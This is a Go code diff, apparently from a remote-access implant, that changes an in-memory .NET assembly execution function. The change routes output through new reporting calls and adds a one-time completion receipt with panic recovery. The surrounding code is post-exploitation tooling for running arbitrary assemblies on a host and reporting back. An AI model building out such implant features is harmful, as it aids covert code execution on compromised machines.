@@ -285,36 +285,54 @@ func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (st
 	return output, invokeErr
 }
 
-func ExecuteAssembly(sh []byte, arguments string) ([]byte, error) {
+func ExecuteAssembly(sh []byte, arguments string, execTaskID uint32) ([]byte, error) {
 	// 立即发送开始执行信息
-	communication.DataProcess(0, []byte("[*] Starting .NET Assembly execution..."))
-	communication.DataProcess(0, []byte(fmt.Sprintf("[*] Assembly size: %d bytes", len(sh))))
-	communication.DataProcess(0, []byte(fmt.Sprintf("[*] Arguments: %s", arguments)))
+	communication.ExecOutput([]byte("[*] Starting .NET Assembly execution..."))
+	communication.ExecOutput([]byte(fmt.Sprintf("[*] Assembly size: %d bytes", len(sh))))
+	communication.ExecOutput([]byte(fmt.Sprintf("[*] Arguments: %s", arguments)))
 
 	// 采用Tshell的简洁有效实现方式
 	go func() {
+		// 完成回执只发一次：正常路径与 panic 路径都经过 sendDone。
+		doneSent := false
+		sendDone := func(ok bool, errMsg string) {
+			if doneSent {
+				return
+			}
+			doneSent = true
+			communication.ExecDone(execTaskID, ok, errMsg)
+		}
+		defer func() {
+			if r := recover(); r != nil {
+				errMsg := fmt.Sprintf("assembly panic: %v", r)
+				debuglog.Printf("[PANIC] %s\n", errMsg)
+				communication.ErrorProcess(errors.New(errMsg))
+				sendDone(false, errMsg)
+			}
+		}()
+
 		debug := true
 		params := strings.Split(arguments, " ")
 
 		// 尝试检测程序集的目标.NET版本
 		detectedVersion := detectDotNetVersion(sh)
-		communication.DataProcess(0, []byte(fmt.Sprintf("[*] Detected target .NET version: %s", detectedVersion)))
+		communication.ExecOutput([]byte(fmt.Sprintf("[*] Detected target .NET version: %s", detectedVersion)))
 
 		// 根据检测到的版本调整CLR版本尝试顺序
 		clrVersions := getOptimalCLRVersions(detectedVersion)
-		communication.DataProcess(0, []byte(fmt.Sprintf("[*] CLR version order: %v", clrVersions)))
+		communication.ExecOutput([]byte(fmt.Sprintf("[*] CLR version order: %v", clrVersions)))
 
 		var lastError error
 		var stdout string
 
 		for _, version := range clrVersions {
-			communication.DataProcess(0, []byte(fmt.Sprintf("[*] Trying CLR version %s...", version)))
+			communication.ExecOutput([]byte(fmt.Sprintf("[*] Trying CLR version %s...", version)))
 			stdout, lastError = LoadBin(sh, params, version, debug)
 			if lastError == nil {
-				communication.DataProcess(0, []byte(fmt.Sprintf("[+] Successfully loaded with CLR %s", version)))
+				communication.ExecOutput([]byte(fmt.Sprintf("[+] Successfully loaded with CLR %s", version)))
 				break
 			} else {
-				communication.DataProcess(0, []byte(fmt.Sprintf("[!] CLR %s failed: %v", version, lastError)))
+				communication.ExecOutput([]byte(fmt.Sprintf("[!] CLR %s failed: %v", version, lastError)))
 			}
 		}
 
@@ -322,15 +340,17 @@ func ExecuteAssembly(sh []byte, arguments string) ([]byte, error) {
 			debuglog.Printf("[DEBUG] All CLR versions failed. Last output: \n%s\n", stdout)
 			communication.ErrorProcess(errors.New("All CLR versions failed: " + lastError.Error()))
 			if stdout != "" {
-				communication.DataProcess(0, []byte("[*] Partial output:"))
-				communication.DataProcess(0, []byte(stdout))
+				communication.ExecOutput([]byte("[*] Partial output:"))
+				communication.ExecOutput([]byte(stdout))
 			}
+			sendDone(false, lastError.Error())
 			return
 		}
 
 		// 成功执行，发送输出
-		communication.DataProcess(0, []byte("[+] Assembly execution completed successfully"))
-		communication.DataProcess(0, []byte(stdout))
+		communication.ExecOutput([]byte("[+] Assembly execution completed successfully"))
+		communication.ExecOutput([]byte(stdout))
+		sendDone(true, "")
 	}()
 
 	return []byte("[*] Executing..."), nil
